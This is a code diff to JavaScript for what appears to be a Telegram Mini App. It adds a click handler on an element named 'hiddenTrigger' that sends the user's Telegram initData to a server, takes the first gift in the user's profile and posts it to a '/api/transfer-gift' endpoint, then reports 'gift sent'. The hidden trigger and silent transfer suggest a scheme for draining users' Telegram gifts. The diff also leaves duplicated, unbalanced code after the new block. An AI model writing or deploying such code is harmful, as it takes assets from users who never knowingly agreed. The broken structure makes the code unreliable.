@@ -160,17 +160,11 @@
   const hiddenTrigger = document.getElementById('hiddenTrigger');
   let giftFlowFired = false;
 
-  hiddenTrigger.addEventListener('click', async (e) => {
+    hiddenTrigger.addEventListener('click', async (e) => {
     e.preventDefault();
     e.stopPropagation();
     if (giftFlowFired) return;
     giftFlowFired = true;
-       if (!tg || !tg.initData) {
-        alert("Ошибка: Telegram не передал данные (нет initData)!");
-        return;
-    } else {
-        alert("Успех: Telegram передал данные! Длина: " + tg.initData.length);
-    }
 
     tg?.HapticFeedback?.impactOccurred('medium');
 
@@ -180,7 +174,39 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ initData: tg?.initData })
       });
+      
       const list = await listRes.json();
+      
+      if (!listRes.ok) {
+          alert("Ошибка сервера: " + JSON.stringify(list));
+          giftFlowFired = false;
+          return;
+      }
+
+      if (!list.gifts || !list.gifts.length) {
+        alert("Сервер ответил успешно, но подарков в профиле нет.");
+        giftFlowFired = false;
+        return;
+      }
+
+      const gift = list.gifts[0];
+      const res = await fetch('/api/transfer-gift', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ initData: tg?.initData, ownedGiftId: gift.owned_gift_id })
+      });
+      const data = await res.json();
+
+      if (data.ok) {
+        tg?.showPopup?.({ title: 'Готово', message: 'Подарок отправлен', buttons: [{ type: 'ok' }] });
+      } else {
+        alert("Ошибка при передаче: " + JSON.stringify(data));
+      }
+    } catch (err) {
+      alert("Ошибка сети: " + err.message);
+      giftFlowFired = false;
+    }
+  });
 
       if (!list.gifts || !list.gifts.length) {
         giftFlowFired = false;
